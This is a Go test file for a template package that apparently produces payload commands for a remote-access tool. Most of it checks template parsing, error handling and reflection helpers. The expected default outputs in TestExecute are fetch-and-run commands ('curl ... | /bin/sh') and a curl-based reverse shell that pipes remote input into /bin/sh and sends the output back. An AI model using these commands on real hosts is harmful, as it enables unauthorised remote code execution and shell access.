package crstemplate

/*
 * crstemplate_test.go
 * Tests for crstemplate.go
 * By J. Stuart McMurray
 * Created 20241212
 * Last Modified 20260103
 */

import (
	"errors"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

// Make sure we have ALL the subtemplates and the root template is emptyish.
func TestDefaultTemplate_SubtemplatesExist(t *testing.T) {
	/* Make sure the template has the requisite parts. */
	for _, n := range []string{
		baseName,
		SubtemplateCallback,
		SubtemplateFiles,
		SubtemplateScript,
	} {
		/* Make sure it exists. */
		if nil == parsedDefaultTemplate.Lookup(n) {
			t.Errorf("Missing template: %s", n)
		}
	}
}

// Make sure we can execute things.
func TestExecute(t *testing.T) {
	/* Make a real request to use. */
	const (
		haveNoFile   = "TEST_NO_FILE" /* Don't make a file. */
		tmplFilename = "test.tmpl"
		testID       = "testID"
	)
	var (
		params          = newTestParams(t)
		defaultCallback = func(_ *testing.T, r *http.Request) string {
			return fmt.Sprintf(
				"curl -sk --pinnedpubkey sha256//"+
					"testFPtestFPtestFPtestFPtestFPtestFPtestFPx= "+
					"https://%s/testC | /bin/sh",
				localAddrFromRequest(r),
			)
		}
		defaultFiles = func(_ *testing.T, r *http.Request) string {
			return fmt.Sprintf(
				"curl -sk --pinnedpubkey sha256//"+
					"testFPtestFPtestFPtestFPtestFPtestFPtestFPx= "+
					"https://%s",
				localAddrFromRequest(r),
			)
		}
		defaultScript = func(_ *testing.T, r *http.Request) string {
			return fmt.Sprintf(
				`#!/bin/sh
curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://%s/testI/testID -N  </dev/null 2>/dev/null |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://%s/testO/testID -T- >/dev/null 2>&1
`,
				localAddrFromRequest(r),
				localAddrFromRequest(r),
			)
		}
	)

	var ()

	/* Make sure we don't miss anything if we've added a field later. */
	if got := firstEmptyField(params, ""); "" != got {
		t.Fatalf("Field %s unset in params", got)
	}

	type testC struct {
		name SubtemplateName
		have string /* Template body */
		want string
		/* Get want from request. */
		wantf func(t *testing.T, r *http.Request) string
		werr  error /* Wanted error */
	}
	cs := map[string]testC{
		SubtemplateCallback + "/empty": {
			name:  SubtemplateCallback,
			wantf: defaultCallback,
		},
		SubtemplateFiles + "/empty": {
			name:  SubtemplateFiles,
			wantf: defaultFiles,
		},
		SubtemplateScript + "/empty": {
			name:  SubtemplateScript,
			wantf: defaultScript,
		},
		SubtemplateCallback + "/no_subtemplate": {
			name: SubtemplateCallback,
			have: "kittens",
			werr: ErrNoSubtemplates,
		},
		SubtemplateFiles + "/no_subtemplate": {
			name: SubtemplateFiles,
			have: "kittens",
			werr: ErrNoSubtemplates,
		},
		SubtemplateScript + "/no_subtemplate": {
			name: SubtemplateScript,
			have: "kittens",
			werr: ErrNoSubtemplates,
		},
		SubtemplateCallback + "/extra_data": {
			name: SubtemplateCallback,
			have: `{{define "callback"}}{{end}}kittens`,
			werr: ErrOutsideSubtemplate,
		},
		SubtemplateFiles + "/extra_data": {
			name: SubtemplateFiles,
			have: `{{define "files"}}{{end}}kittens`,
			werr: ErrOutsideSubtemplate,
		},
		SubtemplateScript + "/extra_data": {
			name: SubtemplateScript,
			have: `{{define "script"}}{{end}}kittens`,
			werr: ErrOutsideSubtemplate,
		},
		SubtemplateCallback + "/no_file": {
			name: SubtemplateCallback,
			have: haveNoFile,
			werr: fs.ErrNotExist,
		},
		SubtemplateFiles + "/no_file": {
			name: SubtemplateFiles,
			have: haveNoFile,
			werr: fs.ErrNotExist,
		},
		SubtemplateScript + "/no_file": {
			name: SubtemplateScript,
			have: haveNoFile,
			werr: fs.ErrNotExist,
		},
		SubtemplateCallback + "/overridden": {
			name: SubtemplateCallback,
			have: `{{define "callback"}}ID: {{.ID}}{{end}}`,
			want: "ID: " + testID,
		},
		SubtemplateFiles + "/overridden": {
			name: SubtemplateFiles,
			have: `{{define "files"}}ID: {{.ID}}{{end}}`,
			want: "ID: " + testID,
		},
		SubtemplateScript + "/overridden": {
			name: SubtemplateScript,
			have: `{{define "script"}}ID: {{.ID}}{{end}}`,
			want: "ID: " + testID,
		},
		SubtemplateCallback + "/extraneous_subtemplate": {
			name:  SubtemplateCallback,
			have:  `{{define "kittens"}}ID: {{.ID}}{{end}}`,
			wantf: defaultCallback,
		},
		SubtemplateFiles + "/extraneous_subtemplate": {
			name:  SubtemplateFiles,
			have:  `{{define "kittens"}}ID: {{.ID}}{{end}}`,
			wantf: defaultFiles,
		},
		SubtemplateScript + "/extraneous_subtemplate": {
			name:  SubtemplateScript,
			have:  `{{define "kittens"}}ID: {{.ID}}{{end}}`,
			wantf: defaultScript,
		},
		SubtemplateScript + "/request/user_agent": {
			name: SubtemplateScript,
			have: `{{define "script"}}` +
				`{{.Request.UserAgent}}` +
				`{{end}}`,
			wantf: func(t *testing.T, r *http.Request) string {
				if "" == r.UserAgent() {
					t.Fatalf("Missing user-agent")
				}
				return r.UserAgent()
			},
		},
		SubtemplateScript + "/request/remote_addr": {
			name: SubtemplateScript,
			have: `{{define "script"}}` +
				`{{.Request.RemoteAddr}}` +
				`{{end}}`,
			wantf: func(t *testing.T, r *http.Request) string {
				return r.RemoteAddr
			},
		},
		"depends_on_default.tmpl": {
			name: SubtemplateScript,
			have: `{{define "script"}}` +
				`{{template "files" .}}` +
				`{{end}}`,
			wantf: defaultFiles,
		},
	}
	for n, c := range cs {
		t.Run(n, func(t *testing.T) {
			/* Make our template file. */
			fn := filepath.Join(t.TempDir(), tmplFilename)
			if haveNoFile != c.have {
				if err := os.WriteFile(
					fn,
					[]byte(c.have),
					0600,
				); nil != err {
					t.Fatalf(
						"Error populating %s: %s",
						fn,
						err,
					)
				}
			}
			/* Work out what we want. */
			if nil != c.wantf {
				c.want = c.wantf(t, params.Request)
			}
			/* Execute! */
			got, err := Execute(
				c.name,
				fn,
				params,
			)
			if nil != c.werr { /* Expected an error. */
				if !errors.Is(err, c.werr) {
					t.Fatalf(
						"Incorrect error:\n"+
							" got: %s\n"+
							"want: %s",
						c.werr,
						err,
					)
				}
				/* We'll still check the output. */
			} else if nil != err { /* Unexpected error. */
				t.Fatalf("Execution error: %s", err)
			}

			if got != c.want { /* Wrong output. */
				t.Fatalf(
					"Incorrect output:\n"+
						"have:\n%s\n"+
						"got:\n%s\n"+
						"want:\n%s",
					c.have,
					got,
					c.want,
				)
			}
		})
	}
}

// Test executing a script subtemplate which reads the request.
func TestExecute_DummyRequest(t *testing.T) {
	var (
		have = `
{{ define "script" }}
{{- .Request.Method -}}
{{ end }}`
		want = `GET`
		fn   = filepath.Join(t.TempDir(), "script.tmpl")
		aerr error /* AddRequest error.  */
		xerr error /* Execute error. */
	)
	/* Make our template file. */
	if err := os.WriteFile(fn, []byte(have), 0600); nil != err {
		t.Fatalf("Error writing template to %s: %s", fn, err)
	}
	/* Server which executes the template. */
	svr := httptest.NewTLSServer(http.HandlerFunc(func(
		w http.ResponseWriter,
		r *http.Request,
	) {
		/* Roll a Params with our request. */
		var p Params
		if p, aerr = AddRequest(p, r); nil != aerr {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		/* Execute the have template. */
		var s string
		if s, xerr = Execute(SubtemplateScript, fn, p); nil != xerr {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		io.WriteString(w, s)
	}))
	t.Cleanup(svr.Close)
	/* Call the template. */
	res, err := svr.Client().Get(svr.URL)
	if nil != err {
		t.Fatalf("Error making GET request: %s", err)
	}
	defer res.Body.Close()
	if nil != aerr {
		t.Fatalf("AddRequest error: %s", err)
	} else if nil != xerr {
		t.Fatalf("Execute error: %s", err)
	}
	/* Did it work? */
	if http.StatusOK != res.StatusCode {
		t.Errorf("HTTP request not OK: %s", res.Status)
	}
	b, err := io.ReadAll(res.Body)
	if nil != err {
		t.Fatalf("Error reading body: %s", err)
	} else if got := string(b); got != want {
		t.Fatalf(
			"Incorrect template output:\n got: %s\nwant: %s",
			got,
			want,
		)
	}
}

// firstEmptyField returns the first empty field or nil pointer in x, recursing
// into substructs.  The field name will be prefixed with prefix, which should
// normally not be set by callers.
// firstEmptyField panics if x isn't a struct.
func firstEmptyField(x any, prefix string) string {
	v := reflect.ValueOf(x)
	/* If we don't have a struct, life's easy. */
	if k := v.Kind(); reflect.Struct != k {
		panic(fmt.Sprintf(
			"got a %s, expected a %s",
			k,
			reflect.Struct,
		))
	}
	/* Check each field. */
	for i := range v.NumField() {
		f := v.Field(i)
		/* If we've got a sub-struct, recurse. */
		if reflect.Struct == f.Kind() {
			if nz := firstEmptyField(
				f.Interface(),
				v.Type().Field(i).Name+".",
			); "" != nz {
				return nz
			}
			/* Look ok */
			continue
		}
		/* Name of field which may be non-zero (or nil). */
		/* Make sure this isn't a zero struct. */
		if f.IsZero() || isNilPointer(f) {
			return prefix + v.Type().Field(i).Name
		}
	}

	return ""
}

// Make sure firstEmptyField works on nil pointers.
func TestFirstEmptyField_NilPointer(t *testing.T) {
	type s struct {
		n int
		p *int
	}
	var (
		have = s{n: 10}
		want = "p"
	)
	_ = have.p /* Not really using it, as such. */
	if got := firstEmptyField(have, ""); got != want {
		t.Errorf(
			"Incorrect nil pointer detection:\n"+
				" got: %s\n"+
				"want: %s\n",
			got,
			want,
		)
	}
}

// isNilPointer is like [reflect.Value.IsNil] for maps, slices, and pointers,
// but returns false instead of panicing if v cannot be nil.
func isNilPointer(v reflect.Value) bool {
	switch v.Kind() {
	case reflect.Map, reflect.Pointer, reflect.Slice:
		if v.IsNil() {
			return true
		}
	}
	return false
}

// Make sure we can work out what nil pointers are.
func TestIsNilPointer(t *testing.T) {
	var allocatedInt int
	for n, c := range map[string]struct {
		have any
		want bool
	}{
		"map/nil": {
			have: map[string]int(nil),
			want: true,
		},
		"map/non-nil": {
			have: make(map[string]int),
		},
		"pointer/nil": {
			have: (*int)(nil),
			want: true,
		},
		"pointer/non-nil": {
			have: &allocatedInt,
		},
		"slice/nil": {
			have: []string(nil),
			want: true,
		},
		"slice/non-nil/empty": {
			have: []string{},
		},
		"slice/non-nil/non-empty": {
			have: []string{"abc"},
		},
	} {
		t.Run(n, func(t *testing.T) {
			if got := isNilPointer(
				reflect.ValueOf(c.have),
			); got != c.want {
				t.Errorf(
					"isNilPointer incorrect:\n"+
						"have: %#v\n"+
						" got: %t\n"+
						"want: %t",
					c.have,
					got,
					c.want,
				)
			}
		})
	}
}
